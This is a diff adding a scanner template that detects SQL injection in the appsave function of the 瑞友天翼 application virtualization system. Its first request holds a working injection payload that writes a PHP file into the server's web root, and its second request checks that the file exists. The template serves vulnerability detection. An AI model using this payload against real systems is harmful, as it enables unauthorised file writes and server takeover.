@@ -1,0 +1,52 @@
+id: poc-yaml-gwt-system-appsave-sqli
+
+info:
+  name: 瑞友天翼应用虚拟化系统 appsave SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects SQL injection vulnerability in 瑞友天翼应用虚拟化系统 appsave functionality.
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: step-1
+    method: GET
+    path:
+      - "{{BaseURL}}/hmrao.php?s=/Admin/appsave&appid=11111111');select+'<%3fphp+echo+md5({{t1}})%3f>'+into+dumpfile+'../../WebRoot/{{t1}}.php'%3b--+"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"appInfo"'
+        part: body
+      - type: word
+        words:
+          - '"result":1'
+        part: body
+
+  - id: step-2
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '{{t2}}'
+        part: body
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "{{t2}}"
